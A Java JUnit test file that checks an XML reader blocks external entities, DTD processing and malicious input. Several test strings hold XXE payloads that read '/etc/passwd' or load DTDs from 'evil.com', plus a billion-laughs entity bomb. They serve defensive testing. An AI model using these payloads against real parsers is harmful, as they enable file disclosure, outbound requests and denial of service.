/**
 * Copyright 2012 Lyncode
 *
 * <p>Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file
 * except in compliance with the License. You may obtain a copy of the License at
 *
 * <p>http://www.apache.org/licenses/LICENSE-2.0
 *
 * <p>Unless required by applicable law or agreed to in writing, software distributed under the
 * License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either
 * express or implied. See the License for the specific language governing permissions and
 * limitations under the License.
 */
package io.gdcc.xoai.xmlio;

import static io.gdcc.xoai.xmlio.matchers.QNameMatchers.localPart;
import static io.gdcc.xoai.xmlio.matchers.XmlEventMatchers.aStartElement;
import static io.gdcc.xoai.xmlio.matchers.XmlEventMatchers.text;
import static org.hamcrest.CoreMatchers.equalTo;
import static org.hamcrest.MatcherAssert.assertThat;
import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.xmlunit.matchers.HasXPathMatcher.hasXPath;

import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.NoSuchElementException;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

class XmlReaderTest {
    private final InputStream inputStream =
            XmlReaderTest.class.getClassLoader().getResourceAsStream("example.xml");

    @Test
    void testRetrieveCurrentAsString() throws Exception {
        XmlReader reader = new XmlReader(inputStream);
        reader.next(aStartElement()).next(aStartElement());
        String string = reader.retrieveCurrentAsString();

        assertThat(string, hasXPath("/one/two"));
    }

    @Test
    void testSecurityConfiguration_ExternalEntitiesDisabled() {
        // Test that external entities are blocked
        String xmlWithExternalEntity =
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                        + "<!DOCTYPE test ["
                        + "<!ENTITY external SYSTEM \"http://evil.com/malicious.dtd\">"
                        + "]>"
                        + "<root>&external;</root>";

        InputStream stream =
                new ByteArrayInputStream(xmlWithExternalEntity.getBytes(StandardCharsets.UTF_8));

        // Should not throw an exception, but should ignore the external entity
        assertDoesNotThrow(
                () -> {
                    try (XmlReader reader = new XmlReader(stream)) {
                        reader.next(aStartElement());
                        assertEquals("root", reader.getName().getLocalPart());

                        // Move to text content and verify external entity was NOT resolved.
                        // If external entities were disabled, trying to retrieve text should result
                        // in an Exception
                        assertThrows(NoSuchElementException.class, () -> reader.next(text()));
                    }
                });
    }

    @Test
    void testSecurityConfiguration_DTDProcessingDisabled() {
        // Test that DTD processing is disabled
        String xmlWithDTD =
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                        + "<!DOCTYPE test ["
                        + "<!ELEMENT root (#PCDATA)>"
                        + "<!ENTITY greeting \"Hello World\">"
                        + "]>"
                        + "<root>&greeting;</root>";

        InputStream stream = new ByteArrayInputStream(xmlWithDTD.getBytes(StandardCharsets.UTF_8));

        // Should not throw an exception but should ignore DTD entities
        assertDoesNotThrow(
                () -> {
                    try (XmlReader reader = new XmlReader(stream)) {
                        reader.next(aStartElement());
                        assertEquals("root", reader.getName().getLocalPart());

                        // Move to text content and verify external entity was NOT resolved.
                        // If external entities were disabled, trying to retrieve text should result
                        // in an Exception
                        assertThrows(NoSuchElementException.class, () -> reader.next(text()));
                    }
                });
    }

    @Test
    void testSecurityConfiguration_EntityReferencesNotReplaced() {
        // Test that entity references are not automatically replaced
        String xmlWithEntityRef =
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                        + "<!DOCTYPE test ["
                        + "<!ENTITY testEntity \"ReplacedValue\">"
                        + "]>"
                        + "<root>&testEntity;</root>";

        InputStream stream =
                new ByteArrayInputStream(xmlWithEntityRef.getBytes(StandardCharsets.UTF_8));

        // Should handle the document without replacing entities
        assertDoesNotThrow(
                () -> {
                    try (XmlReader reader = new XmlReader(stream)) {
                        reader.next(aStartElement());
                        assertEquals("root", reader.getName().getLocalPart());

                        // Move to text content and verify external entity was NOT resolved.
                        // If external entities were disabled, trying to retrieve text should result
                        // in an Exception
                        assertThrows(NoSuchElementException.class, () -> reader.next(text()));
                    }
                });
    }

    @ParameterizedTest
    @ValueSource(
            strings = {
                // XML Bomb (Billion laughs attack)
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE lolz [<!ENTITY lol"
                        + " \"lol\"><!ENTITY lol2"
                        + " \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3"
                        + " \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">"
                        + "]><lolz>&lol3;</lolz>",
                // External entity attack
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                        + "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
                        + "<root>&xxe;</root>",
                // Parameter entity attack
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM"
                        + " \"http://evil.com/evil.dtd\">%xxe;]><root>test</root>"
            })
    void testSecurityConfiguration_MaliciousXMLHandledSafely(String maliciousXml) {
        InputStream stream =
                new ByteArrayInputStream(maliciousXml.getBytes(StandardCharsets.UTF_8));

        // Should not throw security-related exceptions or cause DoS
        assertDoesNotThrow(
                () -> {
                    try (XmlReader reader = new XmlReader(stream)) {
                        // Should be able to read the root element safely
                        reader.next(aStartElement());
                        assertTrue(reader.getName().getLocalPart().matches("(lolz|root)"));
                    }
                });
    }

    @Test
    void testSecurityConfiguration_NormalXMLStillWorks() throws Exception {
        // Test that normal XML processing still works correctly
        String normalXml =
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?><books><book id=\"1\"><title>Test"
                        + " Book</title><author>Test Author</author></book></books>";

        InputStream stream = new ByteArrayInputStream(normalXml.getBytes(StandardCharsets.UTF_8));

        try (XmlReader reader = new XmlReader(stream)) {
            // Navigate to books element
            reader.next(aStartElement());
            assertEquals("books", reader.getName().getLocalPart());

            // Navigate to book element
            reader.next(aStartElement());
            assertEquals("book", reader.getName().getLocalPart());

            // Check attribute
            String bookId = reader.getAttributeValue(localPart(equalTo("id")));
            assertEquals("1", bookId);

            // Navigate to title element
            reader.next(aStartElement());
            assertEquals("title", reader.getName().getLocalPart());
        }
    }

    @Test
    void testSecurityConfiguration_ThreadSafety() throws Exception {
        int threadCount = 5;
        CountDownLatch startLatch = new CountDownLatch(1);
        CountDownLatch finishLatch = new CountDownLatch(threadCount);
        AtomicInteger successCount = new AtomicInteger(0);
        List<Exception> exceptions = Collections.synchronizedList(new ArrayList<>());

        // XML template with positional argument reuse
        String xmlTemplate = "<root%1$d><child>value%1$d</child></root%1$d>";

        for (int i = 0; i < threadCount; i++) {
            final int threadId = i;

            Thread thread =
                    new Thread(
                            () -> {
                                try {
                                    startLatch.await(); // Wait for all threads to be ready

                                    // Each thread gets its own unique XML
                                    String xml = String.format(xmlTemplate, threadId);

                                    InputStream stream =
                                            new ByteArrayInputStream(
                                                    xml.getBytes(StandardCharsets.UTF_8));
                                    try (XmlReader reader = new XmlReader(stream)) {
                                        reader.next(aStartElement());
                                        String rootName = reader.getName().getLocalPart();

                                        // Verify this thread got the correct XML
                                        assertEquals(
                                                "root" + threadId,
                                                rootName,
                                                "Thread " + threadId + " should parse its own XML");

                                        successCount.incrementAndGet();
                                    }
                                } catch (Exception e) {
                                    exceptions.add(e);
                                } finally {
                                    finishLatch.countDown();
                                }
                            });

            thread.start();
        }

        // Signal all threads to start simultaneously
        startLatch.countDown();

        // Wait for all threads to complete
        boolean completed = finishLatch.await(10, TimeUnit.SECONDS);

        // Verify results
        assertTrue(completed, "All threads should complete within timeout");
        assertTrue(exceptions.isEmpty(), "No exceptions should occur: " + exceptions);
        assertEquals(threadCount, successCount.get(), "All threads should succeed");
    }
}
